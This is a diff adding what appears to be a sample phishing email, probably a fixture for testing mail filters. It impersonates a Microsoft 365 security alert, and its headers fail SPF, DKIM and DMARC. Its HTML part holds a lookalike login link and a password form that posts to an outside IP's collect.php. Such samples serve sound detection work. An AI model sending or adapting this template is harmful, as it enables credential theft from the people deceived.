@@ -1,0 +1,33 @@
+Received: from outbound.relay-ms365-auth.com (unknown [45.133.1.77])
+	by mx.contoso.com with ESMTP; Mon, 06 Oct 2025 08:14:22 +0000
+Authentication-Results: mx.contoso.com;
+	spf=softfail smtp.mailfrom=relay-ms365-auth.com;
+	dkim=fail header.d=micros0ft-365-auth.com;
+	dmarc=fail header.from=micros0ft-365-auth.com
+From: "Microsoft 365 Security <security@microsoft.com>" <alerts@micros0ft-365-auth.com>
+To: j.doe@contoso.com
+Subject: Unusual sign-in activity - your password expires today
+Date: Mon, 06 Oct 2025 08:14:20 +0000
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="ms"
+
+--ms
+Content-Type: text/plain; charset="utf-8"
+
+We detected unusual sign-in activity on your account. Your password expires today.
+Verify your account within 24 hours or your access will be suspended.
+Keep password: hxxps://login-microsoftonline[.]account-verify[.]xyz/owa/?user=j.doe
+
+--ms
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+<html><body>
+<p>We detected <b>unusual sign-in</b> activity. Your password expires today.</p>
+<p>Verify your account within 24 hours or your access will be suspended.</p>
+<a href=3D"https://login-microsoftonline.account-verify.xyz/owa/?user=3Dj.doe">Keep my =
+password</a>
+<form action=3D"http://45.133.1.77/collect.php" method=3D"post">
+<input type=3D"password" name=3D"p"></form>
+</body></html>
+--ms--
